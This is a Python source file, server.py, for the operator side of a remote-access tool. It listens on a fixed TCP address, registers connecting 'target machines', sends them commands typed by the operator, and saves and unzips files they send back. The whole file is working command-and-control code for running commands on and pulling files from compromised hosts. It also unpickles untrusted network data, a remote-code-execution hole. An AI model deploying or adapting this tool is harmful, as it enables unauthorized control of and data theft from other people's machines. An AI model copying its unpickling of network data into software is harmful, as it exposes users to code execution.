"""
This is server.py
It will enable us to communicate (send commands and receive files) with the target machine
It works through a TCP connection on 10.30.25.28
"""
#IMPORTS
import os
from pickle import loads
from socket import socket, AF_INET, SOCK_STREAM
from threading import Thread
from zipfile import ZipFile


#CONSTANTS
HEADER = 64
PORT = 5050
SERVER = "10.30.25.28"
ADDRESS = (SERVER, PORT)
FORMAT = 'utf-8'
DISCONNECT_MESSAGE = '!DISCONNECT'
CLIENTS = {}
server = socket(AF_INET, SOCK_STREAM)
server.bind(ADDRESS)


#FUNCTIONS
def send_command():
    """
This function will take commands from the user
and send them to the target machine to be executed
"""
    while True:
        # command = input('>>> ')
        # if command:
        if command:= input('>>> '):
            command = command.split('>')
            try:
                client = CLIENTS.get(command[0].strip())[0]
                command = '>'.join(command[1:]).strip()
                message = command.encode(FORMAT)
                client.send(f"{len(message):<{HEADER}}".encode(FORMAT) + message)
            except Exception:
                continue
def deal_client(client, address, message_type, message):
    """This function will process and display the information received from the client"""
    if message_type == 'NAME':
        name = input(f'What name do you wish to give {address}?'\
                     f'(Leave blank for {message})\t')
        # name = name if name else message
        name = name or message
        CLIENTS.update({name: (client, address)})
    elif message_type == 'FILE':
        file_dir = os.path.join(os.path.expanduser('~'), 'downloads', 'files')
        if not os.path.exists(file_dir):
            os.mkdir(file_dir)
        file_name, data = message
        file_name = os.path.join(file_dir, file_name)
        counter = 0
        while os.path.exists(file_name):
            counter += 1
            file_name = file_name.split('.')
            file_name[-2] = file_name[-2] + f' ({counter})'
            file_name = '.'.join(file_name)
        del counter
        with open(file_name, 'wb') as file:
            file.write(data)
        if file_name.endswith('.zip'):
            file_path = file_name[:len(file_name)-4]
            os.mkdir(file_path)
            with ZipFile(file_name, 'r') as file:
                file.extractall(file_path)
            os.remove(file_name)
    elif message_type in ('ERROR', 'UPDATE'):
        print(f'[{message_type}]', message, sep='\t')
    elif message_type == 'OUTPUT':
        print(message)
    else:
        print('[?]', message, sep='\t')
def handle_client(client, address):
    """
This function will receive information from the client
and send it for processing
"""
    print(f'[CONNECTION]:\t{address} connected')
    while True:
        try:
            try:
                message_length = int(client.recv(HEADER).decode(FORMAT))
            except Exception:
                continue
            if not message_length:
                continue
            message_type, message = loads(client.recv(message_length))
            if message == DISCONNECT_MESSAGE:
                for name, addr in CLIENTS.items():
                    if addr[0] == client:
                        removed_name = name
                del CLIENTS[removed_name]
                client.close()
                print(f'Client {removed_name}{address} DISCONNECTED')
                del removed_name
                break
            deal_client(client, address, message_type, message)
        except (ConnectionResetError, OSError):
            break
        except Exception:
            continue
def start():
    """
This is the main function
Runing this will start the process of exchange of data between this machine and the target machine
"""
    server.listen()
    print(f'[LISTENING]: server is listening on {SERVER}')
    while True:
        client, address = server.accept()
        client_thread = Thread(target=handle_client, args=(client, address))
        command_thread = Thread(target=send_command)
        client_thread.start()
        command_thread.start()


#MAIN
if __name__ == '__main__':
    start()
